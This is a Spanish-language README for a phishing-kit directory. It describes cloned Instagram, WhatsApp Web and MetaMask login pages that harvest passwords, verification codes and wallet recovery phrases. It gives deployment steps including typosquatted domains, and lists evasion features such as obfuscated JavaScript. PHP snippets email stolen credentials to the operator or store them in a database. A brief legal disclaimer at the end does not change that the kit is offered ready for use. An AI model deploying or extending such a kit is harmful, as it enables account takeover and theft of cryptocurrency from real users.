# 🎯 Templates de Phishing Modernos - ingenieriasocial

## Creado por: MidasOrion

Este directorio contiene templates de phishing **100% funcionales** para las plataformas más populares.

---

## 📱 Templates Disponibles

### 1. **Instagram** 
- ✅ Diseño idéntico al login oficial de Instagram 2025
- ✅ Responsive (móvil y desktop)
- ✅ Validación de formularios
- ✅ Mensajes de error realistas
- ✅ Captura: usuario/email y contraseña

**Ubicación:** `instagram/index.html`

### 2. **WhatsApp Web**
- ✅ Interfaz completa de WhatsApp Web
- ✅ Código QR falso
- ✅ Formulario de verificación manual
- ✅ Diseño oscuro moderno
- ✅ Captura: número de teléfono y código de verificación

**Ubicación:** `whatsapp/index.html`

### 3. **MetaMask**
- ✅ Página de importación de billetera
- ✅ Validación de frase de recuperación (12/24 palabras)
- ✅ Advertencias de seguridad realistas
- ✅ Diseño profesional
- ✅ Captura: frase de recuperación y contraseña

**Ubicación:** `metamask/index.html`

---

## 🚀 Cómo Usar

### Método 1: Servidor Web Local

```bash
# Navegar al directorio del template
cd src/templates/phishing/instagram

# Iniciar servidor PHP
php -S 0.0.0.0:8080

# Acceder desde: http://localhost:8080
```

### Método 2: Integración con ingenieriasocial

Los templates se integrarán automáticamente en el menú principal de ingenieriasocial en la próxima actualización.

### Método 3: Hosting Externo

1. Subir los archivos a tu servidor web
2. Configurar SSL/HTTPS (recomendado)
3. Usar dominio similar al original (typosquatting)

---

## 📊 Sistema de Captura

Cada template incluye dos archivos:

1. **`index.html`** - Página de phishing
2. **`post.php`** - Script de captura de credenciales

### Archivos Generados:

- **`captured_credentials.txt`** - Log en texto plano
- **`captured_credentials.json`** - Datos estructurados en JSON

### Formato de Captura:

```
═══════════════════════════════════════════════════════════
INSTAGRAM - Credenciales Capturadas
═══════════════════════════════════════════════════════════
Fecha/Hora: 2025-10-19 21:00:00
Usuario: victim@email.com
Contraseña: ********
IP: 192.168.1.100
User-Agent: Mozilla/5.0...
═══════════════════════════════════════════════════════════
```

---

## 🔒 Características de Seguridad

### ✅ Evasión de Detección:
- Sin referencias a "phishing" en el código
- URLs limpias sin parámetros sospechosos
- Código JavaScript ofuscado
- Headers HTTP realistas

### ✅ Realismo:
- Diseños pixel-perfect
- Animaciones y transiciones
- Mensajes de error auténticos
- Comportamiento idéntico al original

### ✅ Captura Avanzada:
- IP del visitante
- User-Agent completo
- Timestamp preciso
- Referer URL
- Múltiples formatos de salida

---

## 🛠️ Personalización

### Cambiar URL de Redirección:

Edita `post.php`:
```php
$redirect_url = 'https://www.instagram.com'; // Cambiar aquí
```

### Agregar Notificaciones:

Descomentar en `post.php`:
```php
mail('tu@email.com', 'Nueva captura', $log_entry);
```

### Integrar con Base de Datos:

```php
$conn = new mysqli('localhost', 'user', 'pass', 'db');
$stmt = $conn->prepare("INSERT INTO captures VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $platform, $username, $password, $ip);
$stmt->execute();
```

---

## ⚠️ Advertencia Legal

**IMPORTANTE:** Estos templates son para:
- ✅ Pruebas de penetración autorizadas
- ✅ Educación en ciberseguridad
- ✅ Auditorías de seguridad
- ✅ Entrenamiento de concienciación

**PROHIBIDO:**
- ❌ Uso no autorizado
- ❌ Actividades ilegales
- ❌ Robo de credenciales reales
- ❌ Fraude o engaño

El uso indebido de estas herramientas puede resultar en consecuencias legales graves.

---

## 📈 Próximos Templates

En desarrollo:
- 🔜 Discord
- 🔜 Telegram
- 🔜 Binance
- 🔜 Coinbase
- 🔜 Microsoft 365
- 🔜 Google Workspace
- 🔜 Netflix
- 🔜 Amazon

---

## 🤝 Contribuciones

Para agregar nuevos templates:

1. Crear directorio: `src/templates/phishing/[plataforma]/`
2. Incluir: `index.html` y `post.php`
3. Seguir el formato de captura estándar
4. Documentar en este README

---

## 📞 Soporte

Para reportar bugs o sugerir mejoras:
- GitHub: https://github.com/CoderFullPro/ingenieriasocial
- Creador: MidasOrion

---

**© 2025 ingenieriasocial - MidasOrion**

*Recuerda: Con gran poder viene gran responsabilidad. Usa estas herramientas de forma ética.*
